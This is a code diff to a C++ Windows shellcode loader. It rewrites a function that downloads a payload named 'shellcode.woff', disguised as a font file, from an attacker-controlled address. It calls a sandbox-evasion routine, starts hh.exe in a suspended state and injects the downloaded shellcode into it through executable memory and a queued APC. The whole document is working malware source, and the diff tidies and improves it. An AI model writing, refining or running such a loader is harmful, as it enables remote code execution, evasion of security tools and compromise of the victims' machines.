@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <wininet.h>
 #include <string.h>
+#include <vector>
 #include <wincrypt.h>
 #include <psapi.h>
 #include <tlhelp32.h>
@@ -14,79 +15,36 @@
 #include <fstream>
 #pragma comment (lib, "Wininet.lib")
 
-BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
+BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
+    HINTERNET hInternet = InternetOpenW(L"A Custom User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) {
+        std::cerr << "[!] InternetOpenW Failed With Error: " << GetLastError() << std::endl;
+        return FALSE;
+    }
 
-	BOOL		bSTATE            = TRUE;
+    HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
+    if (!hInternetFile) {
+        std::cerr << "[!] InternetOpenUrlW Failed With Error: " << GetLastError() << std::endl;
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
 
-	HINTERNET	hInternet         = NULL,
-			    hInternetFile     = NULL;
+    DWORD bytesRead;
+    BYTE buffer[4096];
+    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
+        payload.insert(payload.end(), buffer, buffer + bytesRead);
+    }
 
-	DWORD		dwBytesRead       = NULL;
-	
-	SIZE_T		sSize             = NULL;
-	PBYTE		pBytes            = NULL,
-			    pTmpBytes          = NULL;
+    if (bytesRead == 0 && GetLastError() != ERROR_SUCCESS) {
+        std::cerr << "[!] InternetReadFile Failed With Error: " << GetLastError() << std::endl;
+        InternetCloseHandle(hInternetFile);
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
 
-
-
-	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
-	if (hInternet == NULL){
-		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
-	}
-
-
-	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-	if (hInternetFile == NULL){
-		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
-	}
-
-
-	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
-	if (pTmpBytes == NULL){
-		bSTATE = FALSE; goto _EndOfFunction;
-	}
-
-	while (TRUE){
-
-		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
-			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
-			bSTATE = FALSE; goto _EndOfFunction;
-		}
-
-		sSize += dwBytesRead;
-
-		if (pBytes == NULL)
-			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
-		else
-			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
-
-		if (pBytes == NULL) {
-			bSTATE = FALSE; goto _EndOfFunction;
-		}
-		
-		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
-		memset(pTmpBytes, '\0', dwBytesRead);
-
-		if (dwBytesRead < 1024){
-			break;
-		}
-	}
-	
-    *pPayloadBytes = pBytes;
-	*sPayloadSize  = sSize;
-
-_EndOfFunction:
-	if (hInternet)
-		InternetCloseHandle(hInternet);
-	if (hInternetFile)
-		InternetCloseHandle(hInternetFile);
-	if (hInternet)
-		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
-	if (pTmpBytes)
-		LocalFree(pTmpBytes);
-	return bSTATE;
+    InternetCloseHandle(hInternetFile);
+    InternetCloseHandle(hInternet);
+    return TRUE;
 }
 
 BOOL CheckVirtualAllocExNuma(){
@@ -127,30 +85,29 @@ void evade() {
 
 int main() {
     evade();
-    LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
-    PBYTE pPayloadBytes = NULL;
-    SIZE_T sPayloadSize = NULL;
+	std::vector<BYTE> payload;
+	LPCWSTR url = L"http://192.168.45.156/shellcode.woff";
 
-    GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize);
-
-	if (pPayloadBytes == NULL || sPayloadSize == NULL) {
+	if (!GetPayloadFromUrl(url, payload)) {
 		printf("[!] Something Failed \n");
 	}
-    STARTUPINFOA si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
 
-    CreateProcessA("C:\\Windows\\hh.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	STARTUPINFOA si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
 
-    HANDLE victimProcess = pi.hProcess;
-    HANDLE threadHandle = pi.hThread;
+	CreateProcessA("C:\\Windows\\hh.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
-    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, sPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	HANDLE victimProcess = pi.hProcess;
+	HANDLE threadHandle = pi.hThread;
 
-    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+	// Use payload.size() for the size.
+	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-    WriteProcessMemory(victimProcess, shellAddress, pPayloadBytes, sPayloadSize, NULL);
+	// Directly use the vector's data for WriteProcessMemory.
+	WriteProcessMemory(victimProcess, shellAddress, payload.data(), payload.size(), NULL);
 
-    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
+	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
 
-    ResumeThread(threadHandle);
+	ResumeThread(threadHandle);
 }
